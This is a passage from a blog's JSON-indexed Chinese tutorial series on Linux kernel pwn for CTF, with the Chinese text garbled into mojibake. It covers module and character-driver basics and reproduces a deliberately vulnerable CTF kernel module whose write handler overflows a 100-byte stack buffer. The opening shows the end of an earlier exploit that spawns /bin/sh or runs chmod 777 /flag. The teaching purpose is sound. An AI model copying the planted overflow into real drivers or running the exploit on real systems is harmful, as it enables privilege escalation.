system(\"/bin/sh\");\n    \n    return 0;\n\n}\n```\n\næˆ–è€…ç›´æ¥`system(\"chmod 777 /flag\");`ä¹Ÿæ˜¯è·å–flagçš„ä¸€ç§æ–¹å¼ã€‚\n\nâ–²vdsoçš„åŠ«æŒä¸€ç›´æ²¡æœ‰å¤ç°æˆåŠŸè¿‡ï¼Œæ˜æ˜å·²ç»åŠ«æŒgettimeofdayå‡½æ•°çš„å†…å®¹ä¸ºshellcodeï¼Œç„¶åä¹ŸæŒ‚è½½äº†å¾ªç¯è°ƒç”¨gettimeofdayçš„ç¨‹åºï¼Œä½†æ˜¯å°±æ˜¯è¿è¡Œä¸äº†shellcodeã€‚\n\n\n\nå‚è€ƒï¼š\n\n[Kernel Pwn å­¦ä¹ ä¹‹è·¯ - ç•ªå¤– - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/204319#h3-12)\n\nhttps://www.jianshu.com/p/07994f8b2bb0\n\nhttps://blog.csdn.net/seaaseesa/article/details/104695399\n\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernelä»0å¼€å§‹(ä¸€)","url":"/2021/09/06/Kernelä»0å¼€å§‹(ä¸€)/","content":"\n\n\n# å‰è¨€\n\nç½‘ä¸Šä¸€å¤§å †æ•™ç¼–è¯‘å†…æ ¸çš„ï¼Œä½†ç”±äºæˆ‘çš„æ°´å¹³å¤ªèœï¼Œå¾ˆå¤šæ•™ç¨‹æˆ‘çœ‹å¾—ç‰¹åˆ«è¿·ç³Šã€‚è¿˜æœ‰ç¬¬ä¸€æ¬¡ç¼–è¯‘å†…æ ¸æ—¶ï¼Œæ²¡è®¾ç½®å¥½å‚æ•°ï¼Œç›´æ¥æŠŠè™šæ‹Ÿæœºç¼–è¯‘ç‚¸å¼€äº†ã€‚æ‰€ä»¥å°±æƒ³ç€èƒ½ä¸èƒ½å…ˆåšä¸ªä¸€é”®è·å–å†…æ ¸æºç å’Œç›¸å…³vmlinuxä»¥åŠbzImageçš„è„šæœ¬ï¼Œå…ˆè¯•è¯•é¢˜ï¼ŒåæœŸå†æ·±å…¥æ¢ç©¶ç¼–è¯‘å†…æ ¸ï¼ŒåŠ å…¥debugç¬¦å·ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªä¸€é”®è„šæœ¬ã€‚\n\nè¿™ä¸ªç›´æ¥çœ‹æˆ‘çš„é¡¹ç›®å°±å¥½äº†ï¼Œæˆ‘æ˜¯ç›´æ¥æ‹–å®˜æ–¹çš„dockerï¼Œç„¶åæŠŠç¼–è¯‘æ‰€éœ€è¦çš„ç¯å¢ƒéƒ½é‡æ–°å®‰è£…äº†ä¸€éï¼ŒåŸºæœ¬å¯ä»¥é€‚é…æ‰€æœ‰ç¯å¢ƒï¼Œå®‰è£…å„ä¸ªç‰ˆæœ¬çš„å†…æ ¸ï¼Œå¤–åŠ è°ƒè¯•ä¿¡æ¯ä¹Ÿå¯ä»¥é…ç½®\n\n[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\nå‰ç½®ç¯å¢ƒï¼Œå‰ç½®çŸ¥è¯†å•¥çš„åœ¨ä¸Šé¢å·²ç»è¶³å¤Ÿäº†ï¼Œå¦‚æœè¿˜æ˜¯æ„Ÿè§‰æœ‰ç‚¹è¿·ç³Šå¯ä»¥å†å»æœæœå…¶ä»–æ•™ç¨‹ã€‚çœ‹é›ªçš„`é’sir`å¸ˆå‚…å’Œcsdnä¸Šçš„`ha1vk`å¸ˆå‚…å°±å¾ˆä¸é”™å•Šï¼Œè¿˜æœ‰å®‰å…¨å®¢ä¸Šçš„`ERROR404`å¸ˆå‚…\n\né’sirå¸ˆå‚…:[Taçš„è®ºå› (pediy.com)](https://bbs.pediy.com/user-818602.htm)\n\nha1vkå¸ˆå‚…:[kernel- CSDNæœç´¢](https://so.csdn.net/so/search?q=kernel&t=blog&u=seaaseesa)\n\nerror404å¸ˆå‚…:[Kernel Pwn å­¦ä¹ ä¹‹è·¯(ä¸€) - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/201043)\n\nè¿™ä¸ªç³»åˆ—è®°å½•æ–°çš„kernelè§£æï¼Œæ—¨åœ¨ä»æºç é¢˜ç›®ç¼–å†™ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬æ¥è¿›è¡Œå„å¼å„æ ·çš„å‡ºé¢˜å¥—è·¯è§£æå’Œexpçš„è§£æã€‚å¦å¤–å†…æ ¸çš„pwnåŸºæœ¬éƒ½æ˜¯åŸºäºæŸä¸ªç‰¹å®šç‰ˆæœ¬çš„å†…æ ¸æ¥è¿›è¡Œæ¨¡å—å¼€å‘ï¼Œè€Œå‡ºæ¼æ´åœ°æ–¹å°±æ˜¯è¿™ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªæ¨¡å—æ¥æ”»ç ´å†…æ ¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›è¡Œå†…æ ¸pwnçš„æ—¶å€™ï¼Œæœ€åº”è¯¥å…ˆå­¦ä¹ çš„å°±æ˜¯ä¸€äº›ç®€å•å†…æ ¸é©±åŠ¨æ¨¡å—çš„å¼€å‘ã€‚\n\n# ä¸€ã€ä¾‹å­ç¼–å†™\n\né¦–å…ˆæœ€ç®€å•å’Œç»å…¸çš„çš„Hello world\n\n```c\n//æ³¨é‡Šå¤´\n\n//ç”±äºåŸºæœ¬éƒ½æ˜¯ç”¨ä¸‹è½½çš„å†…æ ¸ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¤´æ–‡ä»¶ç›´æ¥æ”¾åˆ°æ­£å¸¸çš„ç¼–è¯‘å™¨ä¸­å¯èƒ½æ‰¾ä¸åˆ°å¯¹åº”çš„å¤´æ–‡ä»¶ã€‚\n//åœ¨è‡ªå·±ä¸‹è½½çš„ç¼–è¯‘å¥½çš„å†…æ ¸ä¸­è‡ªå·±æ‰¾å¯¹åº”çš„ï¼Œç„¶åMakefileä¸­æ¥è®¾ç½®å†…æ ¸æºç è·¯å¾„\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstatic int __init hello_init(void) \n{\n    printk(\"PIG007:Hello world!\\n\");\n    return 0;\n}\nstatic void __exit hello_exit(void) \n{\n    printk(\"PIG007:Bye,world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\n## 1.å¤´æ–‡ä»¶ç®€ä»‹\n\n`module.h`:åŒ…å«å¯è£…è½½æ¨¡å—éœ€è¦çš„å¤§é‡ç¬¦å·å’Œå‡½æ•°å®šä¹‰ã€‚\n\n`init.h`:æŒ‡å®šåˆå§‹åŒ–æ¨¡å—æ–¹é¢å’Œæ¸…é™¤å‡½æ•°ã€‚\n\nå¦å¤–å¤§éƒ¨åˆ†æ¨¡å—è¿˜åŒ…æ‹¬`moduleparam.h`å¤´æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è£…è½½çš„æ—¶å€™å‘æ¨¡å—ä¼ é€’å‚æ•°ã€‚è€Œæˆ‘ä»¬å¸¸å¸¸ç”¨çš„å‡½æ•°`_copy_from_user`åˆ™æ¥è‡ªå¤´æ–‡ä»¶`uaccess.h`\n\n## 2.æ¨¡å—è®¸å¯è¯\n\n```c\n//æ³¨é‡Šå¤´\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\n```\n\nè¿™ä¸ªå°±æ˜¯æ¨¡å—è®¸å¯è¯ï¼Œ**å…·ä½“æœ‰å•¥ç”¨ä¸å¤ªæ¸…æ¥š**ï¼Œå¦‚æœ‰å¤§ä½¬æ³è¯·å‘ŠçŸ¥ã€‚å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤æŸ¥è¯¢\n\n```bash\ngrep \"MODULE_LICENSE\" -B 27 /usr/src/linux-headers-`uname -r`/include/linux/module.h\n```\n\n![image-20210927100912684](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210927101536.png)\n\næˆ–è€…ç½‘å€[Linuxå†…æ ¸è®¸å¯è§„åˆ™ â€” The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/translations/zh_CN/process/license-rules.html)\n\n## 3.æ¨¡å—åŠ è½½å¸è½½\n\n### åŠ è½½\n\nä¸€èˆ¬ä»¥ __initæ ‡è¯†å£°æ˜ï¼Œè¿”å›å€¼ä¸º0è¡¨ç¤ºåŠ è½½æˆåŠŸï¼Œä¸ºè´Ÿæ•°è¡¨ç¤ºåŠ è½½å¤±è´¥ã€‚ç”¨æ¥åˆå§‹åŒ–ï¼Œå®šä¹‰ä¹‹ç±»çš„ã€‚\n\n```c\nstatic int __init hello_init(void)\n```\n\nåœ¨æ•´ä¸ªæ¨¡å—çš„æœ€ååŠ ä¸Š\n\n```c\nmodule_init(hello_init);\n```\n\næ¥é€šè¿‡è¿™ä¸ªinitå‡½æ•°åŠ è½½æ¨¡å—\n\n### å¸è½½\n\nä¸€èˆ¬ä»¥ __exitæ ‡è¯†å£°æ˜ï¼Œç”¨æ¥é‡Šæ”¾ç©ºé—´ï¼Œæ¸…é™¤ä¸€äº›ä¸œè¥¿çš„ã€‚\n\n```c\nstatic void __exit hello_exit(void) \n```\n\nåŒæ ·çš„æ¨¡å—æœ€ååŠ ä¸Šä»¥ä¸‹ä»£ç æ¥å¸è½½\n\n```\nmodule_exit(hello_exit);\n```\n\nâ–²å…¶å®åŠ è½½å’Œå¸è½½æœ‰ç‚¹ç±»ä¼¼äºé¢å‘å¯¹è±¡é‡Œçš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ã€‚\n\nä»¥ä¸Šæ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼Œä¸‹é¢è®²è®²å®é™…é¢˜ç›®çš„ç¼–å†™ï¼Œå®é™…çš„é¢˜ç›®ä¸€èˆ¬æ¶‰åŠé©±åŠ¨çš„è£…è½½ã€‚\n\n# äºŒã€é¢˜ç›®ç¼–å†™\n\nç”±äºæ¨¡å—è£…è½½æ˜¯åœ¨å†…æ ¸å¯åŠ¨æ—¶å®Œæˆçš„(rootä¸‹ä¹Ÿå¯ä»¥è®¾ç½®å†insmodè£…è½½)ï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦å®‰è£…é©±åŠ¨ï¼Œé€šè¿‡é©±åŠ¨æ¥å¯åŠ¨æ¨¡å—ä¸­çš„ä»£ç åŠŸèƒ½ã€‚è€Œé©±åŠ¨ç±»å‹ä¹Ÿä¸€èˆ¬æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨ï¼Œä¸€ç§æ˜¯globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨ã€‚\n\nåˆ†é…å¾—åˆ°çš„è®¾å¤‡å·å¯ç”±`cat /proc/devices`æ¥æŸ¥çœ‹\n\n![image-20220330164118552](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164118552.png)\n\n## 1.å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨\n\n### (1)å®‰è£…å¥—è·¯\n\né¦–å…ˆäº†è§£ä¸€ä¸‹é©±åŠ¨è®¾å¤‡çš„ç»“æ„ä½“ï¼š\n\n```c\n///linux/cdev.h   kernel 5.14.8\n\nstruct cdev {\n\tstruct kobject kobj;\t// å†…åµŒçš„kobjectå¯¹è±¡\n\tstruct module *owner;\t// æ‰€å±æ¨¡å—\n\tconst struct file_operations *ops;\t// æ–‡ä»¶æ“ä½œç»“æ„ä½“,ç”¨æ¥è¿›è¡Œäº¤äº’\n\tstruct list_head list;\n\tdev_t dev;\t\t\t\t// è®¾å¤‡å·\n\tunsigned int count;\n} __randomize_layout;\n```\n\nç„¶åå°±æ˜¯å¥—è·¯ç¼–å†™\n\n```c\n// è®¾å¤‡ç»“æ„ä½“\nstruct xxx_dev_t {\n    struct cdev cdev;\n} xxx_dev;\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°\nstatic int __init xxx_init(void)\n{\n    char* DEV_NAME = 'PIG-007';\n    // åˆå§‹åŒ–cdev\n    cdev_init(&xxx_dev.cdev, &xxx_fops); \n    xxx_dev.cdev.owner = THIS_MODULE;\n    \n    // è·å–å­—ç¬¦è®¾å¤‡å·\n    if (xxx_major) {\n     \t//ä½¿ç”¨æŒ‡å®šçš„è®¾å¤‡å·è¿›è¡Œåˆ†é…,xxx_dev_noä¸ºè®¾å¤‡å·,1ä¸ºè®¾å¤‡ä¸ªæ•°\n        register_chrdev_region(xxx_dev_no, 1, DEV_NAME);\n    } else {\n        alloc_chrdev_region(&xxx_dev_no, 1, DEV_NAME);\n    }\n    //ç”³è¯·è®¾å¤‡å·å¸¸ç”¨alloc_chrdev_region,è¡¨åŠ¨æ€ç”³è¯·è®¾å¤‡å·\n    //å¦‚æœæŒ‡å®šåˆ†é…çš„æ—¶å€™å¦‚æœå ç”¨äº†å°±å®¹æ˜“å‡ºé”™\n    \n    // æ³¨å†Œè®¾å¤‡\n    ret = cdev_add(&xxx_dev.cdev, xxx_dev_no, 1); \n    \n}\n// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°\nstatic void __exit xxx_exit(void)\n{\n    // é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·\n    unregister_chrdev_region(xxx_dev_no, 1); \n    cdev_del(&xxx_dev.cdev);\n}\n```\n\nè¿™æ ·ç®€å•çš„é©±åŠ¨å°±å®‰è£…å®Œäº†ï¼Œå®‰è£…å®Œäº†ä¹‹åï¼Œæˆ‘ä»¬æƒ³è¦ä½¿ç”¨è¿™ä¸ªé©±åŠ¨çš„è¯ï¼Œè¿˜éœ€è¦è¿›è¡Œäº¤äº’ï¼Œå‘é©±åŠ¨è®¾å¤‡ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥ä¸Šé¢çš„`xxx_fops`ï¼Œå³`file_operations`è¿™ä¸ªç»“æ„ä½“å°±èµ·åˆ°äº†è¿™ä¸ªåŠŸèƒ½ã€‚\n\næœ‰çš„æ—¶å€™å®‰è£…æ³¨å†Œè®¾å¤‡é©±åŠ¨éœ€è¦ç”¨åˆ°classæ¥åˆ›å»ºæ³¨å†Œï¼ŒåŸå› æœªçŸ¥ï¼š\n\n```c\nstatic int __init xxx_init(void)\n{\n    buffer_var=kmalloc(100,GFP_DMA);\n    printk(KERN_INFO \"[i] Module xxx registered\");\n    if (alloc_chrdev_region(&dev_no, 0, 1, \"xxx\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, dev_no, NULL, \"xxx\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module xxx error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &xxx_fops);\n    if (cdev_add(&cdev, dev_no, 1) == -1)\n    {\n        device_destroy(devClass, dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(dev_no), MINOR(dev_no));\n    return 0;\n\n}\n```\n\n\n\n### (2)äº¤äº’å¥—è·¯\n\nå®‰è£…å®Œæˆä¹‹åè¿˜éœ€è¦äº¤äº’ï¼Œç”¨åˆ°`file_operations`ç»“æ„ä½“ä¸­çš„æˆå‘˜å‡½æ•°ï¼Œé¦–å…ˆäº†è§£ä¸‹è¿™ä¸ªç»“æ„ä½“ã€‚\n\n```C\n///linux/fs.h \tkernel 5.14.8\n\nstruct file_operations {\n\tstruct module *owner;\n\tloff_t (*llseek) (struct file *, loff_t, int);\n\tssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n\tssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n\tssize_t (*read_iter) (struct kiocb *, struct iov_iter *);\n\tssize_t (*write_iter) (struct kiocb *, struct iov_iter *);\n\tint (*iopoll)(struct kiocb *kiocb, bool spin);\n\tint (*iterate) (struct file *, struct dir_context *);\n\tint (*iterate_shared) (struct file *, struct dir_context *);\n\t__poll_t (*poll) (struct file *, struct poll_table_struct *);\n\tlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n\tlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n\tint (*mmap) (struct file *, struct vm_area_struct *);\n\tunsigned long mmap_supported_flags;\n\tint (*open) (struct inode *, struct file *);\n\tint (*flush) (struct file *, fl_owner_t id);\n\tint (*release) (struct inode *, struct file *);\n\tint (*fsync) (struct file *, loff_t, loff_t, int datasync);\n\tint (*fasync) (int, struct file *, int);\n\tint (*lock) (struct file *, int, struct file_lock *);\n\tssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);\n\tunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);\n\tint (*check_flags)(int);\n\tint (*flock) (struct file *, int, struct file_lock *);\n\tssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);\n\tssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);\n\tint (*setlease)(struct file *, long, struct file_lock **, void **);\n\tlong (*fallocate)(struct file *file, int mode, loff_t offset,\n\t\t\t  loff_t len);\n\tvoid (*show_fdinfo)(struct seq_file *m, struct file *f);\n#ifndef CONFIG_MMU\n\tunsigned (*mmap_capabilities)(struct file *);\n#endif\n\tssize_t (*copy_file_range)(struct file *, loff_t, struct file *,\n\t\t\tloff_t, size_t, unsigned int);\n\tloff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,\n\t\t\t\t   struct file *file_out, loff_t pos_out,\n\t\t\t\t   loff_t len, unsigned int remap_flags);\n\tint (*fadvise)(struct file *, loff_t, loff_t, int);\n} __randomize_layout;\n```\n\nå…·ä½“ä¸€ç‚¹ä½¿ç”¨å¦‚ä¸‹\n\n![image-20220330164350249](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164350249.png)\n\nå‚è€ƒ:https://www.youtube.com/watch?v=EJ0JQKvxf70&list=PLEJtkJ02eJVX9I66wJD1tn07R52DxVXG0&index=4\n\nå…¶ä¸­å¸¸ç”¨çš„å°±æ˜¯readï¼Œwriteç­‰å‡½æ•°ã€‚\n\nä¹‹åä¹Ÿæ˜¯æ­£å¸¸çš„è°ƒç”¨å‡½æ•°ï¼Œå¥—è·¯ç¼–å†™\n\n```C\n// è¯»è®¾å¤‡\nssize_t xxx_read(struct file *filp, char __user *buf, size_t count, \n                loff_t *f_pos)\n{\n    ...\n    copy_to_user(buf, ..., ...); // å†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºçš„å¤åˆ¶\n    ...\n}\n// å†™è®¾å¤‡\nssize_t xxx_write(struct file *filp, const char __user *buf, \n                 size_t count, loff_t *f_pos)\n{\n    ...\n    copy_from_user(..., buf, ...); // ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºåˆ°å†…æ ¸ç©ºé—´çš„å¤åˆ¶\n    ...\n}\n\n// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶\nlong xxx_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    ...\n    switch (cmd) {\n    case XXX_CMD1:\n        ...\n        break;\n    case XXX_CMD2:\n        ...\n        break;\n    default:\n        // ä¸æ”¯æŒçš„å‘½ä»¤\n        return -ENOTTY;\n    }\n    return 0;\n}\n```\n\nç„¶åéœ€è¦`file_operations`ç»“æ„ä½“ä¸­çš„å‡½æ•°æ¥é‡å†™ç”¨æˆ·ç©ºé—´çš„writeï¼Œopenï¼Œreadç­‰å‡½æ•°ï¼š\n\n```c\nstatic struct file_operations xxx_fops =\n        {\n                .owner = THIS_MODULE,\n                // .open = xxx_open,\n                // .release = xxx_close,\n                .write = xxx_write,\n                .read = xxxx_read\n        };\n```\n\nè¿™æ ·å½“ç”¨æˆ·ç©ºé—´æ‰“å¼€è¯¥è®¾å¤‡ï¼Œè°ƒç”¨è¯¥è®¾å¤‡çš„`write`å‡½æ•°ï¼Œå°±èƒ½é€šè¿‡`.write`è¿›å…¥åˆ°`xxx_write`å‡½æ•°ä¸­ã€‚\n\nâ–²è¿™æ ·ä¸€äº›å¸¸è§„kernelé¢˜çš„ç¼–å†™æ¨¡æ¿å°±æ€»ç»“å‡ºæ¥äº†ã€‚\n\n### (3)å…·ä½“çš„é¢˜ç›®\n\nåŸé¢˜ï¼šhttps://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric\n\n#### â‘ ä»£ç å’Œç®€å•çš„è§£æ\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h> \n\n//æ­£å¸¸çš„è®¾ç½®äº†dev_tå’Œcdevï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„classè¿™ä¸ªæ¨¡æ¿æ¥åˆ›å»ºè®¾å¤‡é©±åŠ¨\n//é«˜12ä½ä¸ºä¸»è®¾å¤‡å·ï¼Œä½20ä½ä¸ºæ¬¡è®¾å¤‡å·\nstatic dev_t first; // Global variable for the first device number\nstatic struct cdev c_dev; // Global variable for the character device structure\nstatic struct class *cl; // Global variable for the device class\nstatic char *buffer_var;\n\n//æ‰“å¼€å…³é—­è®¾å¤‡çš„æ¶ˆæ¯æç¤ºå‡½æ•°\nstatic int vuln_open(struct inode *i, struct file *f)\n{\n  printk(KERN_INFO \"[i] Module vuln: open()\\n\");\n  return 0;\n}\nstatic int vuln_close(struct inode *i, struct file *f)\n{\n  printk(KERN_INFO \"[i] Module vuln: close()\\n\");\n  return 0;\n}\n\n//ä»buffer_varä¸­è¯»å–æ•°æ®\nstatic ssize_t vuln_read(struct file *f, char __user *buf, size_t len, loff_t *off)\n{\n  if(strlen(buffer_var)>0) {\n    printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var);\n    kfree(buffer_var);\n    buffer_var=kmalloc(100,GFP_DMA);\n    return 0;\n  } else {\n    return 1;\n  }\n}\n//å‘bufferä¸­å†™å…¥æ•°æ®ï¼Œç„¶åæ‹·è´ç»™buffer_varï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´å­˜åœ¨ç‚¹ã€‚\n//ç”±äºlenå’Œbuféƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œbufferæ˜¯æ ˆä¸Šçš„æ•°æ®ï¼Œé•¿åº¦ä¸º100ã€‚\n//æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡lenå’Œbufï¼Œå°†æ•°æ®å¤åˆ¶ç»™bufferä»è€Œè¿›è¡Œæ ˆæº¢å‡ºã€‚\nstatic ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)\n{\n  char buffer[100]={0};\n  if (_copy_from_user(buffer, buf, len))\n    return -EFAULT;\n  buffer[len-1]='\\0';\n  printk(\"[i] Module vuln write: %s\\n\", buffer);\n  strncpy(buffer_var,buffer,len);\n  return len;//è¿”å›å€¼ä¸èƒ½ä¸º0,ä¸ç„¶ä¼šä¸€ç›´è°ƒç”¨è¯¥å‡½æ•°\n}\n\n//file_operationsç»“æ„ä½“åˆå§‹åŒ–\nstatic struct file_operations pugs_fops =\n{\n  .owner = THIS_MODULE,\n  .open = vuln_open,\n  .release = vuln_close,\n  .write = vuln_write,\n  .read = vuln_read\n};\n\n//é©±åŠ¨è®¾å¤‡åŠ è½½å‡½æ•°\nstatic int __init vuln_init(void) /* Constructor */\n{\n  buffer_var=kmalloc(100,GFP_DMA);\n  printk(KERN_INFO \"[i] Module vuln registered\");\n  if (alloc_chrdev_region(&first, 0, 1, \"vuln\") < 0)\n  {\n    return -1;\n  }\n  if ((cl = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n  {\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n  if (device_create(cl, NULL, first, NULL, \"vuln\") == NULL)\n  {\n    printk(KERN_INFO \"[i] Module vuln error\");\n    class_destroy(cl);\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n  cdev_init(&c_dev, &pugs_fops);\n  if (cdev_add(&c_dev, first, 1) == -1)\n  {\n    device_destroy(cl, first);\n    class_destroy(cl);\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n\n  printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(first), MINOR(first));\n  return 0;\n}\n\n//é©±åŠ¨è®¾å¤‡å¸è½½å‡½æ•°\nstatic void __exit vuln_exit(void) /* Destructor */\n{\n    unregister_chrdev_region(first, 3);\n    printk(KERN_INFO \"Module vuln unregistered\");\n}\n\nmodule_init(vuln_init);\nmodule_exit(vuln_exit);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"blackndoor\");\nMODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n#### â‘¡å†…æ ¸å‡½æ•°è§£æ\n\n##### `printk`:\n\n```c\nprintk(æ—¥å¿—çº§åˆ« \"æ¶ˆæ¯æ–‡æœ¬\");\n```\n\nå…¶ä¸­æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\n#defineKERN_EMERG \"<0>\"/*ç´§æ€¥äº‹ä»¶æ¶ˆæ¯ï¼Œç³»ç»Ÿå´©æºƒä¹‹å‰æç¤ºï¼Œè¡¨ç¤ºç³»ç»Ÿä¸å¯ç”¨*/\n#defineKERN_ALERT \"<1>\"/*æŠ¥å‘Šæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¿…é¡»ç«‹å³é‡‡å–æªæ–½*/\n#defineKERN_CRIT \"<2>\"/*ä¸´ç•Œæ¡ä»¶ï¼Œé€šå¸¸æ¶‰åŠä¸¥é‡çš„ç¡¬ä»¶æˆ–è½¯ä»¶æ“ä½œå¤±è´¥*/\n#define KERN_ERR \"<3>\"/*é”™è¯¯æ¡ä»¶ï¼Œé©±åŠ¨ç¨‹åºå¸¸ç”¨KERN_ERRæ¥æŠ¥å‘Šç¡¬ä»¶çš„é”™è¯¯*/\n#define KERN_WARNING \"<4>\"/*è­¦å‘Šæ¡ä»¶ï¼Œå¯¹å¯èƒ½å‡ºç°é—®é¢˜çš„æƒ…å†µè¿›è¡Œè­¦å‘Š*/\n#define KERN_NOTICE \"<5>\"/*æ­£å¸¸ä½†åˆé‡è¦çš„æ¡ä»¶ï¼Œç”¨äºæé†’ã€‚å¸¸ç”¨äºä¸å®‰å…¨ç›¸å…³çš„æ¶ˆæ¯*/\n#define KERN_INFO \"<6>\"/*æç¤ºä¿¡æ¯ï¼Œå¦‚é©±åŠ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ‰“å°ç¡¬ä»¶ä¿¡æ¯*/\n#define KERN_DEBUG \"<7>\"/*è°ƒè¯•çº§åˆ«çš„æ¶ˆæ¯*/\n```\n\n##### `kmalloc`:\n\n```C\nstatic inline void *kmalloc(size_t size, gfp_t flags)\n```\n\nå…¶ä¸­flagsä¸€èˆ¬è®¾ç½®ä¸ºGFP_KERNELæˆ–è€…GFP_DMAï¼Œåœ¨å †é¢˜ä¸­ä¸€èˆ¬å°±æ˜¯\n\nGFP_KERNELæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š\n\nã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€ã€€GFP_KERNEL\nã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ ä¸­æ–­å¤„ç†ç¨‹åºã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ è½¯ä¸­æ–­ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ Taskletã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€GFP_DMA | GFP_KERNEL\nã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€GFP_DMA **|GFP_ATOMIC**\n\nå…·ä½“å¯ä»¥çœ‹\n\n[Linuxå†…æ ¸ç©ºé—´å†…å­˜ç”³è¯·å‡½æ•°kmallocã€kzallocã€vmallocçš„åŒºåˆ«ã€è½¬ã€‘ - sky-heaven - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/sky-heaven/p/7390370.html)\n\n`kzmalloc`ç±»ä¼¼ï¼Œå°±æ˜¯åˆ†é…ç©ºé—´å¹¶ä¸”å†…å­˜åˆå§‹åŒ–ä¸º0\n\n##### `kfree`:\n\nè¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œå°±æ˜¯ç®€å•çš„é‡Šæ”¾ã€‚\n\n##### `copy_from_user`:\n\n```c\ncopy_from_user(void *to, const void __user 